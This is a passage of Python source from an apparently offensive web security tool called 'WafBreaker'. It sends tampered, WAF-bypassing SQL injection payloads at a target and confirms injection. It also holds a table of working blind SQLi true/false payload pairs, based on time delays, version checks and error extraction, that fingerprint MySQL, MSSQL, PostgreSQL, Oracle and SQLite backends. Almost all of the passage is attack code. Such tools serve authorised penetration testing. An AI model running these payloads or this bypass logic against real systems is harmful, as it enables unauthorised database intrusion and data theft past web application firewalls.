                        repair_payload = tampered,
                        repair_label   = "direct VULN pattern via %s" % tname,
                        db_variant     = None,
                        bool_confirmed = False,
                        source         = "Tamper Sweep (Phase 4) — %s" % tname,
                        extra_payload  = tampered,
                        bypass_desc    = tname,
                    )

                # First bypass confirmation triggers DB fingerprint
                if not sqli_confirmed and oc in ("PASSED", "BYPASS", "VULN!"):
                    sqli_confirmed = True
                    self._log("[*] Phase 4 bypass confirmed: %s + %s — firing DB fingerprint..." % (
                        cat_label, tname))
                    self._phase_sqli_fingerprint()

                # Try additional spread-sampled seeds from this category.
                # _spread_sample picks up to 4 structurally diverse entries
                # so we cover quote-types, numeric, parenthesis variants etc.
                # without exhausting all N payloads in the category.
                for extra_seed in _spread_sample(seed_payloads, 4)[1:]:
                    try:
                        tampered2 = tfunc(extra_seed)
                    except Exception:
                        continue
                    if tampered2 == extra_seed:
                        continue
                    req2 = self._build_request(tampered2, **kwargs)
                    st2, body2 = self._send(req2)
                    oc2 = self._outcome(st2, body2)
                    self._report("[P4b] %s | %s" % (cat_label, tname),
                                 tampered2, st2, body2, oc2)
                    if oc2 == "VULN!":
                        self._add_issue(
                            "SQL Injection Confirmed via Tamper — %s" % tname,
                            "WafBreaker confirmed <b>SQL Injection</b> using tamper "
                            "<b>%s</b> on spread-sampled seed from <b>%s</b>.<br><br>"
                            "Tampered payload: <code>%s</code><br>"
                            "Response status: <b>%d</b>"
                            % (tname, cat_label, tampered2[:400], st2),
                            severity="High",
                            confidence="Certain",
                        )

        self._log("[Phase 4 complete] — %d variants sent." % done)

    # ── SQLi DB fingerprint (fires when a bypass payload passes) ─────────────
    def _phase_sqli_fingerprint(self):
        """
        Send true/false differential pairs for each major DB engine.
        A difference in response length/content between TRUE and FALSE confirms
        blind SQLi and identifies the backend.
        """
        self._log("[Phase 3.5] DB Fingerprint: sending true/false pairs...")

        # Each tuple: (label, true_payload, false_payload)
        fingerprints = [
            # ── MySQL / MariaDB ───────────────────────────────────────────────
            ("MySQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MySQL  SLEEP",  "1 AND SLEEP(0)--", "1 AND SLEEP(5)--"),
            ("MySQL  VER  ",
             "1 AND SUBSTRING(@@version,1,1)>'3'--",
             "1 AND SUBSTRING(@@version,1,1)>'9'--"),
            ("MySQL  EXTV ",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,'no'))--"),
            # ── MSSQL ─────────────────────────────────────────────────────────
            ("MSSQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MSSQL  WAIT ",  "1; WAITFOR DELAY '0:0:0'--",
                              "1; WAITFOR DELAY '0:0:5'--"),
            ("MSSQL  VER  ",
             "1 AND SUBSTRING(@@version,1,9)='Microsoft'--",
             "1 AND SUBSTRING(@@version,1,9)='ZZZZZZ'--"),
            # ── PostgreSQL ────────────────────────────────────────────────────
            ("PgSQL  TRUE ",
             "1 AND 1=(SELECT 1)--",
             "1 AND 1=(SELECT 2)--"),
            ("PgSQL  SLEEP",
             "1 AND (SELECT 1 FROM PG_SLEEP(0))=1--",
             "1 AND (SELECT 1 FROM PG_SLEEP(5))=1--"),
            ("PgSQL  VER  ",
             "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
             "' AND 1=CAST('no' AS NUMERIC)--"),
            # ── Oracle ────────────────────────────────────────────────────────
            ("Oracle TRUE ",
             "1 AND 1=1 FROM DUAL--",
             "1 AND 1=2 FROM DUAL--"),
            ("Oracle PIPE ",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',0)=1--",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--"),
            # ── SQLite ────────────────────────────────────────────────────────
            ("SQLite TRUE ",
             "1 AND 1=1--",
             "1 AND 1=2--"),
            ("SQLite VER  ",
             "1 AND SQLITE_VERSION()>'3'--",
             "1 AND SQLITE_VERSION()>'9'--"),
        ]

        for label, true_pl, false_pl in fingerprints:
            # Send TRUE condition
            kwargs_t = {}
            t_pl, kw_t = self._apply_bypass(true_pl,  kwargs_t)
            req_t  = self._build_request(t_pl, **kw_t)
            st_t, body_t = self._send(req_t)

            # Send FALSE condition
            kwargs_f = {}
            f_pl, kw_f = self._apply_bypass(false_pl, kwargs_f)
            req_f  = self._build_request(f_pl, **kw_f)
            st_f, body_f = self._send(req_f)

            # Differential detection
            len_t = len(body_t)
            len_f = len(body_f)
            diff  = abs(len_t - len_f)
            if diff > 20 or st_t != st_f:
                diff_label = "DIFF=%d" % diff
                oc_t = "VULN!"
                oc_f = "VULN!"
                self._log("[!!!] %s — response differential %d bytes (T:%d F:%d)" % (
                    label.strip(), diff, st_t, st_f))
                self._add_issue(
                    "Blind SQL Injection Confirmed — %s" % label.strip(),
                    "WafBreaker detected a <b>response differential</b> confirming "
                    "blind SQL injection via the <b>%s</b> fingerprint pair.<br><br>"
                    "TRUE condition payload:&nbsp;&nbsp;<code>%s</code><br>"
                    "Response: <b>%d bytes</b> (HTTP %d)<br><br>"
                    "FALSE condition payload: <code>%s</code><br>"
                    "Response: <b>%d bytes</b> (HTTP %d)<br><br>"
                    "Differential: <b>%d bytes</b> — the backend responded differently "
                    "to the boolean condition, confirming blind injection."
                    % (label.strip(),
                       true_pl[:300], len_t, st_t,
                       false_pl[:300], len_f, st_f,
                       diff),
                    severity="High",
                    confidence="Certain",
                )
            else:
                diff_label = "SAME"
                oc_t = self._outcome(st_t, body_t)
                oc_f = self._outcome(st_f, body_f)

            self._report(
                label + " [TRUE]  " + diff_label,
                true_pl, st_t, body_t, oc_t)
            self._report(
                label + " [FALSE] " + diff_label,
                false_pl, st_f, body_f, oc_f)

            time.sleep(0.08)

        self._log("[Phase 3.5 complete]")
